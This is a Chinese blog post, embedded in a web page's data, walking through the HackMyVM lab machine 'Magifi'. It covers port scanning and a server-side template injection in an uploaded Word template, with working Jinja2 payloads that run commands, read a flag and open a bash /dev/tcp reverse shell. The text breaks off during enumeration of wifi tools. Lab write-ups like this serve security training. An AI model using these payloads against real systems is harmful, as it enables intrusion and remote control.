<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1e38cf25637a4908.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1e38cf25637a4908.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-81a2b7b9623e52f7.js" defer=""></script><script src="/_next/static/Ccn3Uy_j8m9kBQAk6sKIJ/_buildManifest.js" defer=""></script><script src="/_next/static/Ccn3Uy_j8m9kBQAk6sKIJ/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMMagifi","contentHtml":"\u003ch1\u003eMagifi.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Magifi\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Magifi\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes: \u003cstrong\u003eMagiFi is a machine designed to test a variety of offensive security skills, including web, network, wifi and privilege escalation techniques, requiring knowledge of network analysis and authentication mechanisms offering a realistic and immersive experience within a controlled environment. Creators @x4v1l0k and @M4rdc0re.\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e第一台\u003ccode\u003eHard\u003c/code\u003e靶机，看介绍存在\u003ccode\u003eWIFI\u003c/code\u003e利用也是第一次碰到\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003enmap\u003c/code\u003e扫描，\u003ccode\u003e26\u003c/code\u003e是靶机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~/Desktop/test/magifi]\n└─# nmap -sP 192.168.56.0/24                     \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 05:14 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00053s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00029s latency).\nMAC Address: 08:00:27:34:2E:28 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.26\nHost is up (0.00042s latency).\nMAC Address: 08:00:27:33:7C:E1 (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~/Desktop/test/magifi]\n└─# nmap -sT -min-rate 10000 -p- 192.168.56.26\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 05:15 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.26\nHost is up (0.00047s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:33:7C:E1 (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e需要设置域名\u003ccode\u003ehogwarts.htb\u003c/code\u003e 记录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~/Desktop/test/magifi]                                                                                                                      \n└─# nmap -sT -A -T4 -O -p 22,80 192.168.56.26                                                                                                                \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 05:16 EST                                                                                           \nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.26                                                                                                                           \nHost is up (0.00059s latency).                                                                                                                               \n                                                                                                                                                             \nPORT   STATE SERVICE VERSION                                                  \n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:                                                                \n|   3072 0c:c6:d6:24:1e:5b:9e:66:25:0a:ba:0a:08:0b:18:40 (RSA)                                                                                               \n|   256 9c:c3:1d:ea:22:04:93:b7:81:\u003cspan class=\"hljs-built_in\"\u003edd\u003c/span\u003e:f2:96:5d:f0:1f:9b (ECDSA)                                                                                              \n|_  256 55:41:15:90:ff:1d:53:88:e7:65:91:4f:fd:cf:49:85 (ED25519)                                                                                            \n80/tcp open  http    Werkzeug/3.0.4 Python/3.8.10                                                                                                            \n|_http-title: Did not follow redirect to http://hogwarts.htb                                                                                                 \n|_http-server-header: Werkzeug/3.0.4 Python/3.8.10                                                                                                           \n| fingerprint-strings:                                                                                                                                       \n|   GetRequest, HTTPOptions:                                                                                                                                 \n|     HTTP/1.1 302 FOUND                                                                                                                                     \n|     Server: Werkzeug/3.0.4 Python/3.8.10                                \n|     Date: Wed, 12 Feb 2025 10:16:22 GMT                                                                                                                    \n|     Content-Type: text/html; charset=utf-8                                  \n|     Content-Length: 225          \n|     Location: http://hogwarts.htb                                           \n|     Connection: close                                                                                                                                      \n|     \u0026#x3C;!doctype html\u003e                                                                                                                                        \n|     \u0026#x3C;html lang=en\u003e                                                                                                                                         \n|     \u0026#x3C;title\u003eRedirecting...\u0026#x3C;/title\u003e                                           \n|     \u0026#x3C;h1\u003eRedirecting...\u0026#x3C;/h1\u003e                                                                                                                                \n|     \u0026#x3C;p\u003eYou should be redirected automatically to the target URL: \u0026#x3C;a href=\u003cspan class=\"hljs-string\"\u003e\"http://hogwarts.htb\"\u003c/span\u003e\u003ehttp://hogwarts.htb\u0026#x3C;/a\u003e. If not, click the \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e.            \n|   RTSPRequest:                                                                                                                                             \n|     \u0026#x3C;!DOCTYPE HTML PUBLIC \u003cspan class=\"hljs-string\"\u003e\"-//W3C//DTD HTML 4.01//EN\"\u003c/span\u003e                                                                                                      \n|     \u003cspan class=\"hljs-string\"\u003e\"http://www.w3.org/TR/html4/strict.dtd\"\u003c/span\u003e\u003e                                                                                                               \n|     \u0026#x3C;html\u003e                                                                                                                                                 \n|     \u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003ehead\u003c/span\u003e\u003e                                                                                                                                                 \n|     \u0026#x3C;meta http-equiv=\u003cspan class=\"hljs-string\"\u003e\"Content-Type\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"text/html;charset=utf-8\"\u003c/span\u003e\u003e                                                                                     \n|     \u0026#x3C;title\u003eError response\u0026#x3C;/title\u003e                                                                                                                          \n|     \u0026#x3C;/head\u003e                                                                                                                                                \n|     \u0026#x3C;body\u003e                                                                  \n|     \u0026#x3C;h1\u003eError response\u0026#x3C;/h1\u003e                                                                                                                                \n|     \u0026#x3C;p\u003eError code: 400\u0026#x3C;/p\u003e                                                  \n|     \u0026#x3C;p\u003eMessage: Bad request version (\u003cspan class=\"hljs-string\"\u003e'RTSP/1.0'\u003c/span\u003e).\u0026#x3C;/p\u003e                                                                                                      \n|     \u0026#x3C;p\u003eError code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u0026#x3C;/p\u003e                                                      \n|     \u0026#x3C;/body\u003e                                                                                                                                                \n|_    \u0026#x3C;/html\u003e          \nMAC Address: 08:00:27:33:7C:E1 (Oracle VirtualBox virtual NIC)                                                                                               \nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        \nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose                                                                                                                                 \nRunning: Linux 4.X|5.X                                                                                                                                       \nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5           \nOS details: Linux 4.15 - 5.8                                                                                                                                 \nNetwork Distance: 1 hop                                                       \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   \n                                                                              \nTRACEROUTE                                                                                                                                                   \nHOP RTT     ADDRESS                                                                                                                                          \n1   0.59 ms 192.168.56.26                                           \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再扫描一下网站目录，扫描出来\u003ccode\u003eupload\u003c/code\u003e文件夹，那么表示可能存在上传功能\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~/Desktop/test]\n└─# dirsearch -u http://hogwarts.htb -x 403 -e php,zip,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25\nWordlist size: 10439\n\nOutput File: /root/Desktop/test/reports/http_hogwarts.htb/_25-02-12_05-22-08.txt\n\nTarget: http://hogwarts.htb/\n\n[05:22:08] Starting: \n[05:23:02] 405 -  153B  - /upload\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问页面，并采集指纹，采用\u003ccode\u003eflask\u003c/code\u003e搭建，那么可能存在\u003ccode\u003eSSTI\u003c/code\u003e （需要注意）, 内容大概是和哈利波特有关\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMagifi/image83.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e优先级\u003ccode\u003e80\u003c/code\u003e \u003e \u003ccode\u003e22\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003e上传功能点测试\u003c/h2\u003e\n\u003cp\u003e在页面最底下果然发现了上传文件功能，并且告诉我们使用他们的模板\u003ccode\u003etemplate\u003c/code\u003e ，是个超链接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMagifi/image84.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e点击后是下载了一个\u003ccode\u003edocx\u003c/code\u003e文件，内容是，我们先按照它的格式填写好并上传\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eApplication Letter to Hogwarts School of Witchcraft and Wizardry\nDear Headmaster or Headmistress,\n\nI am writing to express my strong interest \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e applying \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e admission to Hogwarts School of Witchcraft and Wizardry. From a very young age, I have been fascinated by the magical world, and I believe that Hogwarts is the ideal place \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e me to develop my skills and knowledge \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e magic. I am eager to learn and grow under the guidance of the esteemed professors at your prestigious institution.\n\nThroughout my life, I have demonstrated qualities such as curiosity, perseverance, and a deep desire to learn. I am particularly interested \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e subjects such as Charms, Potions, and Defense Against the Dark Arts, and I am confident that Hogwarts will provide me with the perfect environment to explore these interests.\n\nI am excited about the opportunity to become a part of the rich tradition and community at Hogwarts, and I hope that my application will be considered \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the upcoming academic year. I have enclosed all required documents and would be grateful \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e your consideration.\n\nThank you \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e your \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e and consideration. I look forward to the possibility of joining Hogwarts and contributing to its legacy of excellence.\n\nYours sincerely,\n\nName: [Your Name]\nSurname: [Your Surname]\nAddress: [Your Address]\nBirthday: [Your Birthday]\nPet breed: [Your Pets Breed]\nPet’s Name: [Your Pets Name]\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传之后回显我们输入的内容\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMagifi/image85.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eSSTI 漏洞利用\u003c/h2\u003e\n\u003cp\u003e测试一下是否存在\u003ccode\u003eSSTI\u003c/code\u003e ，我们将\u003ccode\u003ename\u003c/code\u003e设置为 \u003ccode\u003eName: {{ 7*7 }}\u003c/code\u003e ，然后提交上传\u003c/p\u003e\n\u003cp\u003e欸嘿，果然存在\u003ccode\u003eSSTI\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMagifi/image86.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e开始构造\u003ccode\u003eSSTI\u003c/code\u003e ：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eName: {{self.__init__.__globals__.__builtins__}} ，且存在\u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e 和__import__\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMagifi/image87.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eName: {{self.__init__.__globals__.__builtins__.__import__(\u003cspan class=\"hljs-string\"\u003e'os'\u003c/span\u003e).popen(\u003cspan class=\"hljs-string\"\u003e'id'\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e()}}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMagifi/image88.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我直接读取\u003ccode\u003eUserFlag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eName:{{self.__init__.__globals__.__builtins__.__import__(\u003cspan class=\"hljs-string\"\u003e'os'\u003c/span\u003e).popen(\u003cspan class=\"hljs-string\"\u003e'cat /home/ harry_potter/user.txt'\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e()}}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e注意空格,在有空格地方不能换行，在没空格的地方用空格顶到换行，否则空格会被换行符替换掉，然后上传上去的时候去掉换行符你的\u003ccode\u003epayload\u003c/code\u003e会变成 \u003ccode\u003ecat/home…\u003c/code\u003e 了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMagifi/image89.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e反弹\u003ccode\u003eshell\u003c/code\u003e ，\u003ccode\u003ekali\u003c/code\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eName: {{self.__init__.__globals__.__builtins__.__import__(\u003cspan class=\"hljs-string\"\u003e'os'\u003c/span\u003e).popen(\u003cspan class=\"hljs-string\"\u003e'/bin/bash -c \"bash -  i \u003e\u0026#x26; /dev/tcp/192.168.56.4/4444 0\u003e\u0026#x26;1\"'\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e()}}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e┌──(root㉿kali)-[~/Desktop/test/magifi]\n└─# nc -lvp 4444                           \nlistening on [any] 4444 ...\nconnect to [192.168.56.4] from hogwarts.htb [192.168.56.26] 39508\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (766): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\nharry_potter@MagiFi:~/Hogwarts_web$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e靶机信息收集\u003c/h2\u003e\n\u003cp\u003e存在很多的无线网卡，并且能看到还有\u003ccode\u003eDocker\u003c/code\u003e的网卡\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~$ ip add                                                 \n1: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                                                                    \n    inet 127.0.0.1/8 scope host lo                                            \n       valid_lft forever preferred_lft forever                                                                                                               \n    inet6 ::1/128 scope host                                                  \n       valid_lft forever preferred_lft forever\n2: enp0s3: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 08:00:27:33:7c:e1 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.56.26/24 brd 192.168.56.255 scope global dynamic enp0s3\n       valid_lft 529sec preferred_lft 529sec                                                                                                                 \n    inet6 fe80::a00:27ff:fe33:7ce1/64 scope \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e                     \n       valid_lft forever preferred_lft forever\n14: docker0: \u0026#x3C;NO-CARRIER,BROADCAST,MULTICAST,UP\u003e mtu 1500 qdisc noqueue state DOWN group default \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 02:42:10:80:36:d9 brd ff:ff:ff:ff:ff:ff\n    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n       valid_lft forever preferred_lft forever\n15: wlan0: \u0026#x3C;BROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff                        \n16: wlan1: \u0026#x3C;BROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff                        \n17: wlan2: \u0026#x3C;BROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff                        \n18: wlan3: \u0026#x3C;BROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff\n19: wlan4: \u0026#x3C;BROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff                        \n20: wlan5: \u0026#x3C;BROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff                        \n21: wlan6: \u0026#x3C;BROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff                        \n75: wlan60: \u0026#x3C;BROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                     \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 02:00:00:00:3c:00 brd ff:ff:ff:ff:ff:ff                                                                                                       \n76: hwsim0: \u0026#x3C;BROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                     \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ieee802.11/radiotap 12:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff          \n78: veth1@if77: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default qlen 1000                                                    \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether f6:e7:d7:e4:13:c6 brd ff:ff:ff:ff:ff:ff link-netnsid 0         \n    inet 10.200.1.1/24 scope global veth1     \n       valid_lft forever preferred_lft forever                                                                                                               \n    inet6 fe80::f4e7:d7ff:fee4:13c6/64 scope \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e     \n       valid_lft forever preferred_lft forever                          \n80: veth2@if79: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default qlen 1000                                                    \n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 2a:c1:47:8c:c6:64 brd ff:ff:ff:ff:ff:ff link-netnsid 1\n    inet 10.200.2.1/24 scope global veth2     \n       valid_lft forever preferred_lft forever                                                                                                               \n    inet6 fe80::28c1:47ff:fe8c:c664/64 scope \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e     \n       valid_lft forever preferred_lft forever         \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看权限，可以使用\u003ccode\u003eroot\u003c/code\u003e权限运行很多网络工具\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e harry_potter on MagiFi:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser harry_potter may run the following commands on MagiFi:\n    (root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng,\n        /usr/sbin/airodump-ng, /usr/bin/airdecap-ng, /usr/bin/hostapd-mana\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/sbin/aireplay-ng --\u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/sbin/airmon-ng -h\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/sbin/airodump-ng --\u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/airdecap-ng --\u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/hostapd-mana -h\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e解法 1\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e根据群友们提示\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e首先查看\u003ccode\u003ehostapd-mana\u003c/code\u003e的帮助\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eharry_potter@MagiFi:~/Hogwarts_web$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/hostapd-mana -h\nhostapd-mana v2.6\nUser space daemon \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e IEEE 802.11 AP management,\nIEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator\nCopyright (c) 2002-2016, Jouni Malinen \u0026#x3C;j@w1.fi\u003e and contributors\n--------------------------------------------------\nMANA https://github.com/sensepost/hostapd-mana\nBy @singe (dominic@sensepost.com)\nOriginal MANA EAP by Ian (ian@sensepost.com)\nOriginal karma patches by Robin Wood - robin@digininja.org\nOriginal EAP patches by Brad Antoniewicz @brad_anton\nSycophant by Michael Kruger @_cablethief\nusage: hostapd [-hdBKtv] [-P \u0026#x3C;PID file\u003e] [-e \u0026#x3C;entropy file\u003e] \\\n         [-g \u0026#x3C;global 